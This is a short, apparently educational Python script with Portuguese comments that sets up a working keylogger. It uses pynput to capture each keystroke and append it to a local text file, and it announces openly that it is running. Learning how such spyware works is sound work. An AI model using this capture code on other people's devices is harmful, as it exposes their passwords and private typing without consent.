from pynput.keyboard import Listener

# 1. Essa é a função que o fantasminha executa toda vez que você aperta uma tecla
def capturar_tecla(tecla):
    # Transforma a tecla em texto puro (pra tirar umas aspas que o Python coloca)
    tecla_texto = str(tecla).replace("'", "")
    
    # 2. Abre o caderninho do espião (o arquivo txt) no modo "a" (append/adicionar)
    # Se o arquivo não existir, ele cria. Se existir, ele adiciona no final.
    with open("teclas_capturadas.txt", "a") as caderninho:
        caderninho.write(tecla_texto + "\n")

# 3. Aqui a gente liga o fantasminha e manda ele ficar escutando ("Listening")
print("Espião ativado! Digite qualquer coisa. Para parar, volte aqui e aperte Ctrl + C.")
with Listener(on_press=capturar_tecla) as fofoqueiro:
    fofoqueiro.join()
